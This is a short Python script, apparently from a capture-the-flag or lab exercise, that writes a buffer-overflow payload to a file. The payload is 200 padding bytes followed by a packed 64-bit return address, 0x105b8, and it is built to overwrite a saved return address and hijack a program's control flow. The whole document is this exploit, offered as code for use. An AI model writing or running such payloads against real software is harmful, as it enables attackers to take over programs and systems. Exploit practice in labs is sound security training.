import struct

payload = b"A"*200 + struct.pack("<Q", 0x105b8)
open("payload","wb").write(payload)